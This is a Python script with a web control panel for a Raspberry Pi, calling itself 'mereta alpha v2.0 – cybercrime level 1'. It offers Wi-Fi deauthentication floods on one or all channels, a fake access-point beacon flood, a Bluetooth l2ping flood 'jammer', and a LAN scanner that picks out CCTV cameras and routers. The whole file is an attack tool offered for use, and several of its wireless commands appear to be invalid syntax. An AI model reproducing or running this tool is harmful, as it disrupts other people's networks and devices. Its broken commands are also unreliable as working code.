#!/usr/bin/env python3
"""
mereta alpha v2.0 - cybercrime level 1
more brutal - faster - device scanner
for raspberry pi zero w
"""

import os
import time
import subprocess
import threading
import json
import socket
import ipaddress
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

# ============================================
# konfigurasi
# ============================================

interface = "wlan0"
attack_running = False
current_attack = "idle"
scan_results = []
devices_found = []
bluetooth_running = False

# ============================================
# fungsi serangan yang lebih brutal
# ============================================

def scan_wifi_networks():
    """scan wifi lebih cepat (3 detik vs 10 detik)"""
    global scan_results
    scan_results = []
    try:
        # lebih cepat dengan timeout kecil
        os.system(f"sudo iw dev {interface} scan > /tmp/scan_result 2>&1 &")
        time.sleep(2)
        
        with open("/tmp/scan_result", "r") as f:
            content = f.read()
        
        lines = content.split('\n')
        ssid = ""
        bssid = ""
        signal = ""
        
        for line in lines:
            if "bssid" in line.lower() or "bss" in line:
                parts = line.split()
                if len(parts) > 1:
                    bssid = parts[1]
            elif "ssid:" in line.lower():
                ssid = line.split("ssid:")[1].strip()
                if ssid and ssid != "" and bssid:
                    scan_results.append({"ssid": ssid, "bssid": bssid, "signal": signal})
                    ssid = ""
                    bssid = ""
            elif "signal:" in line.lower():
                parts = line.split()
                if len(parts) > 1:
                    signal = parts[1]
        return scan_results
    except:
        return []

def device_scan():
    """scan device lebih cepat dan akurat"""
    global devices_found
    devices_found = []
    
    # 1. arp scan (deteksi device terhubung)
    try:
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "(" in line and ")" in line:
                ip = line.split("(")[1].split(")")[0]
                mac = line.split("at ")[1].split(" ")[0] if "at " in line else "unknown"
                if ip.startswith("192.168"):
                    devices_found.append({"ip": ip, "mac": mac, "status": "online"})
    except:
        pass
    
    # 2. ping sweep (parallel, lebih cepat)
    base_ip = "192.168.1"
    alive = []
    
    def ping(ip):
        response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
        if response == 0:
            alive.append(ip)
    
    threads = []
    for i in range(1, 255):
        ip = f"{base_ip}.{i}"
        t = threading.Thread(target=ping, args=(ip,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    # 3. deteksi tipe device berdasarkan port
    for ip in alive[:30]:
        device_type = "unknown"
        for port, dtype in [(80, "web"), (22, "ssh/linux"), (23, "telnet/router"), 
                            (443, "https"), (554, "cctv"), (37777, "cctv/dahua"), 
                            (8000, "dvr"), (8080, "proxy")]:
            result = os.system(f"nc -zv {ip} {port} 2>&1 > /dev/null")
            if result == 0:
                device_type = dtype
                break
        
        devices_found.append({"ip": ip, "type": device_type, "status": "alive"})
    
    return devices_found

def start_deauth_brutal(duration=60):
    """deauth lebih brutal - 1000 packet per cycle"""
    global attack_running, current_attack
    attack_running = True
    current_attack = "deauth_brutal"
    end = time.time() + duration
    
    channels = [1, 6, 11]  # channel paling umum
    
    while attack_running and time.time() < end:
        for ch in channels:
            os.system(f"sudo iwconfig {interface} channel {ch}")
            for _ in range(1000):
                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b ff:ff:ff:ff:ff:ff")
            time.sleep(0.005)
    
    if attack_running:
        current_attack = "idle"

def start_all_channels(duration=60):
    """serang semua channel sekaligus - paling sadis"""
    global attack_running, current_attack
    attack_running = True
    current_attack = "all_channels"
    end = time.time() + duration
    channels = [1,2,3,4,5,6,7,8,9,10,11]
    
    def attack_channel(ch):
        while attack_running and time.time() < end:
            os.system(f"sudo iwconfig {interface} channel {ch}")
            for _ in range(500):
                os.system(f"sudo iw dev {interface} send deauth -c {ch} -b ff:ff:ff:ff:ff:ff")
            time.sleep(0.01)
    
    threads = []
    for ch in channels:
        t = threading.Thread(target=attack_channel, args=(ch,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    if attack_running:
        current_attack = "idle"

def start_ap_overload(duration=60):
    """banjiri dengan AP palsu - bikin router kewalahan"""
    global attack_running, current_attack
    attack_running = True
    current_attack = "ap_overload"
    end = time.time() + duration
    ssids = [f"fake_ap_{i}" for i in range(50)]
    
    while attack_running and time.time() < end:
        for ssid in ssids:
            os.system(f"sudo iw dev {interface} mgmt beacon -c 6 -s '{ssid}' -w 100")
        time.sleep(0.05)
    
    if attack_running:
        current_attack = "idle"

def start_bluetooth_brutal(duration=60):
    """bluetooth jammer lebih brutal"""
    global attack_running, current_attack, bluetooth_running
    attack_running = True
    current_attack = "bluetooth_brutal"
    bluetooth_running = True
    end = time.time() + duration
    
    while attack_running and bluetooth_running and time.time() < end:
        # reset terus menerus
        os.system("sudo hciconfig hci0 reset 2>/dev/null")
        os.system("sudo hciconfig hci0 down 2>/dev/null")
        os.system("sudo hciconfig hci0 up 2>/dev/null")
        # flood scan
        for _ in range(10):
            os.system("sudo hcitool scan 2>/dev/null &")
        # l2ping flood
        os.system("sudo l2ping -s 600 -f ff:ff:ff:ff:ff:ff 2>/dev/null &")
        time.sleep(0.1)
    
    bluetooth_running = False
    if attack_running:
        current_attack = "idle"

def stop_all():
    global attack_running, current_attack, bluetooth_running
    attack_running = False
    current_attack = "idle"
    bluetooth_running = False
    os.system("sudo pkill -9 aireplay-ng 2>/dev/null")
    os.system("sudo pkill -9 arpspoof 2>/dev/null")
    os.system("sudo pkill -9 l2ping 2>/dev/null")
    os.system("sudo pkill -9 hcitool 2>/dev/null")
    os.system("sudo pkill -9 wpa_cli 2>/dev/null")

def get_network_info():
    """info jaringan + ip gateway"""
    try:
        result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
        gateway = result.stdout.split()[2] if result.stdout else "unknown"
        return {"gateway": gateway}
    except:
        return {"gateway": "unknown"}

# ============================================
# web server
# ============================================

html_page = '''<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>mereta alpha v2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#fff;font-family:'courier new',monospace;font-weight:300;font-size:12px;color:#cc0000;padding:15px;}
.container{max-width:550px;margin:0 auto;border:1px solid #cc0000;padding:20px;background:#fff;}
.header{text-align:center;margin-bottom:25px;border-bottom:1px solid #cc0000;padding-bottom:15px;}
.title{font-size:28px;letter-spacing:3px;font-weight:300;}
.subtitle{font-size:9px;color:#cc0000;margin-top:5px;opacity:0.7;}
.warning{background:#ffeeee;border-left:3px solid #cc0000;padding:10px;margin-bottom:20px;font-size:10px;}
.section{margin-bottom:22px;}
.section-title{font-size:10px;margin-bottom:8px;color:#cc0000;letter-spacing:1px;}
input,button{background:#fff;border:1px solid #cc0000;color:#cc0000;padding:8px;font-family:'courier new',monospace;font-size:11px;outline:none;}
input{width:180px;}
button{cursor:pointer;margin-left:5px;}
button:hover{background:#cc0000;color:#fff;}
.result-area{margin-top:10px;padding:8px;border:1px solid #ffcccc;min-height:60px;max-height:150px;overflow-y:auto;font-size:10px;}
.result-line{color:#cc0000;margin:3px 0;opacity:0.8;}
.footer{margin-top:20px;padding-top:10px;border-top:1px solid #ffcccc;font-size:9px;}
.status{color:#cc0000;}
.red{color:#cc0000;}
.green{color:#006600;}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="title">mereta alpha v2</div>
<div class="subtitle">cybercrime level 1 - more brutal</div>
</div>
<div class="warning">
[!] extreme danger - total destruction mode<br>
[!] use at your own risk
</div>
<div class="section">
<div class="section-title">> network info</div>
<button id="netbtn">get network info</button>
<div id="netresult" class="result-area">not scanned</div>
</div>
<div class="section">
<div class="section-title">> wifi scan</div>
<button id="scanbtn">scan networks</button>
<div id="scanresult" class="result-area">not scanned yet</div>
</div>
<div class="section">
<div class="section-title">> device scanner (brutal)</div>
<button id="devscanbtn">scan all devices</button>
<div id="devresult" class="result-area">scan to see devices (cctv, router, phone)</div>
</div>
<div class="section">
<div class="section-title">> attack menu (more brutal)</div>
<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px;">
<button id="deauthbtn" style="background:#ffeeee;">deauth brutal</button>
<button id="allchbtn" style="background:#ffeeee;">all channels</button>
<button id="apbtn" style="background:#ffeeee;">ap overload</button>
<button id="btbtn" style="background:#ffeeee;">bt brutal</button>
<button id="stopbtn" style="background:#cc0000;color:#fff;">stop all</button>
</div>
<div>duration: <input type="number" id="duration" value="30" min="5" max="300"> seconds</div>
<div id="attackstatus" class="result-area" style="margin-top:12px;">status: idle</div>
</div>
<div class="footer">
<span class="status" id="status">status: ready</span><br>
<span class="red">*** total destruction mode ***</span>
</div>
</div>
<script>
const netbtn = document.getElementById('netbtn');
const scanbtn = document.getElementById('scanbtn');
const deauthbtn = document.getElementById('deauthbtn');
const allchbtn = document.getElementById('allchbtn');
const apbtn = document.getElementById('apbtn');
const btbtn = document.getElementById('btbtn');
const stopbtn = document.getElementById('stopbtn');
const devscanbtn = document.getElementById('devscanbtn');
const duration = document.getElementById('duration');
const netresult = document.getElementById('netresult');
const scanresult = document.getElementById('scanresult');
const attackstatus = document.getElementById('attackstatus');
const devresult = document.getElementById('devresult');
const statusspan = document.getElementById('status');

async function fetchJson(url, options={}) {
    const res = await fetch(url, options);
    return res.json();
}

netbtn.onclick = async () => {
    netresult.innerHTML = '<div class="result-line">getting...</div>';
    const data = await fetchJson('/api/network');
    netresult.innerHTML = `<div class="result-line">gateway: ${data.gateway}</div>`;
};

scanbtn.onclick = async () => {
    scanresult.innerHTML = '<div class="result-line">scanning...</div>';
    statusspan.innerText = 'status: scanning';
    try {
        const data = await fetchJson('/api/scan');
        if(data.networks && data.networks.length > 0) {
            let html = `<div class="result-line">found ${data.networks.length} networks:</div>`;
            for(let net of data.networks.slice(0,15)) {
                html += `<div class="result-line">  > ${net.ssid} - ${net.bssid}</div>`;
            }
            scanresult.innerHTML = html;
        } else {
            scanresult.innerHTML = '<div class="result-line">no networks found</div>';
        }
        statusspan.innerText = 'status: ready';
    } catch(e) {
        scanresult.innerHTML = '<div class="result-line">scan error</div>';
        statusspan.innerText = 'status: error';
    }
};

devscanbtn.onclick = async () => {
    devresult.innerHTML = '<div class="result-line">scanning devices (brutal mode)...</div>';
    statusspan.innerText = 'status: device scanning';
    try {
        const data = await fetchJson('/api/devices');
        if(data.devices && data.devices.length > 0) {
            let html = `<div class="result-line">found ${data.devices.length} devices:</div>`;
            for(let dev of data.devices.slice(0,25)) {
                let typeIcon = dev.type === 'cctv' ? '📹' : dev.type === 'router' ? '📡' : dev.type === 'web' ? '🌐' : '💻';
                html += `<div class="result-line">  ${typeIcon} ${dev.ip} - ${dev.type} ${dev.mac ? `(${dev.mac})` : ''}</div>`;
            }
            devresult.innerHTML = html;
        } else {
            devresult.innerHTML = '<div class="result-line">no devices found</div>';
        }
        statusspan.innerText = 'status: ready';
    } catch(e) {
        devresult.innerHTML = '<div class="result-line">scan error</div>';
        statusspan.innerText = 'status: error';
    }
};

deauthbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<div class="result-line red">[!] brutal deauth starting...</div>';
    statusspan.innerText = 'status: attacking';
    try {
        await fetchJson('/api/attack/deauth?duration=' + dur);
        attackstatus.innerHTML = `<div class="result-line red">[!] brutal deauth active - ${dur}s</div>`;
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                if(d.current_attack === 'idle') {
                    attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
                    statusspan.innerText = 'status: ready';
                }
            });
        }, dur * 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">attack error</div>';
        statusspan.innerText = 'status: error';
    }
};

allchbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<div class="result-line red">[!] all channels attack starting...</div>';
    statusspan.innerText = 'status: attacking';
    try {
        await fetchJson('/api/attack/allchannels?duration=' + dur);
        attackstatus.innerHTML = `<div class="result-line red">[!] all channels active - ${dur}s</div>`;
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                if(d.current_attack === 'idle') {
                    attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
                    statusspan.innerText = 'status: ready';
                }
            });
        }, dur * 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">attack error</div>';
        statusspan.innerText = 'status: error';
    }
};

apbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<div class="result-line red">[!] ap overload starting...</div>';
    statusspan.innerText = 'status: attacking';
    try {
        await fetchJson('/api/attack/apoverload?duration=' + dur);
        attackstatus.innerHTML = `<div class="result-line red">[!] ap overload active - ${dur}s</div>`;
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                if(d.current_attack === 'idle') {
                    attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
                    statusspan.innerText = 'status: ready';
                }
            });
        }, dur * 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">attack error</div>';
        statusspan.innerText = 'status: error';
    }
};

btbtn.onclick = async () => {
    const dur = duration.value;
    attackstatus.innerHTML = '<div class="result-line red">[!] brutal bt jammer starting...</div>';
    statusspan.innerText = 'status: attacking';
    try {
        await fetchJson('/api/attack/bluetooth?duration=' + dur);
        attackstatus.innerHTML = `<div class="result-line red">[!] brutal bt jammer active - ${dur}s</div>`;
        setTimeout(() => {
            fetchJson('/api/status').then(d => {
                if(d.current_attack === 'idle') {
                    attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
                    statusspan.innerText = 'status: ready';
                }
            });
        }, dur * 1000);
    } catch(e) {
        attackstatus.innerHTML = '<div class="result-line red">attack error</div>';
        statusspan.innerText = 'status: error';
    }
};

stopbtn.onclick = async () => {
    await fetchJson('/api/stop');
    attackstatus.innerHTML = '<div class="result-line red">[!] all attacks stopped</div>';
    statusspan.innerText = 'status: ready';
    setTimeout(() => {
        attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
    }, 1000);
};

setInterval(async () => {
    try {
        const data = await fetchJson('/api/status');
        if(data.current_attack !== 'idle' && !attackstatus.innerHTML.includes(data.current_attack)) {
            attackstatus.innerHTML = `<div class="result-line red">[!] ${data.current_attack} active</div>`;
        }
        if(data.current_attack === 'idle' && attackstatus.innerHTML.includes('active')) {
            attackstatus.innerHTML = '<div class="result-line">status: idle</div>';
            statusspan.innerText = 'status: ready';
        }
    } catch(e) {}
}, 2000);
</script>
</body>
</html>'''

class handler(BaseHTTPRequestHandler):
    def log_message(self, *args, **kwargs):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_page.encode())
        
        elif self.path == '/api/network':
            info = get_network_info()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(info).encode())
        
        elif self.path == '/api/scan':
            networks = scan_wifi_networks()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'networks': networks}).encode())
        
        elif self.path == '/api/status':
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'current_attack': current_attack, 'running': attack_running}).encode())
        
        elif self.path == '/api/devices':
            devices = device_scan()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'devices': devices}).encode())
        
        elif self.path.startswith('/api/attack/deauth'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_deauth_brutal, args=(duration,)).start()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started', 'attack': 'deauth_brutal'}).encode())
        
        elif self.path.startswith('/api/attack/allchannels'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_all_channels, args=(duration,)).start()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started', 'attack': 'all_channels'}).encode())
        
        elif self.path.startswith('/api/attack/apoverload'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_ap_overload, args=(duration,)).start()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started', 'attack': 'ap_overload'}).encode())
        
        elif self.path.startswith('/api/attack/bluetooth'):
            duration = int(self.path.split('duration=')[1]) if 'duration=' in self.path else 30
            threading.Thread(target=start_bluetooth_brutal, args=(duration,)).start()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started', 'attack': 'bluetooth_brutal'}).encode())
        
        elif self.path == '/api/stop':
            stop_all()
            self.send_response(200)
            self.send_header('content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'stopped'}).encode())
        
        else:
            self.send_response(404)
            self.end_headers()

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============================================
# main
# ============================================

if __name__ == '__main__':
    os.system('clear')
    print('\033[91m╔════════════════════════════════════════════╗')
    print('║              mereta alpha v2.0                ║')
    print('║         cybercrime level 1 - web              ║')
    print('║           more brutal - faster                ║')
    print('╚════════════════════════════════════════════╝\033[0m')
    
    os.system(f"sudo ifconfig {interface} up 2>/dev/null")
    
    local_ip = get_ip()
    print(f'\n\033[91m[!]\033[0m server running at:')
    print(f'\033[91m    http://localhost:8080\033[0m')
    print(f'\033[91m    http://{local_ip}:8080\033[0m')
    print(f'\n\033[91m[!]\033[0m fitur baru:')
    print(f'\033[91m    - device scanner (cctv, router, web, ssh)\033[0m')
    print(f'\033[91m    - all channels attack (serang 11 channel sekaligus)\033[0m')
    print(f'\033[91m    - ap overload (50 fake ap)\033[0m')
    print(f'\033[91m    - brutal deauth (1000 packet/cycle)\033[0m')
    print(f'\033[91m    - brutal bluetooth jammer\033[0m')
    print(f'\n\033[91m[!]\033[0m press ctrl+c to stop\n')
    
    server = HTTPServer(('0.0.0.0', 8080), handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\n\033[91m[!]\033[0m mereta alpha terminated')
        server.shutdown()
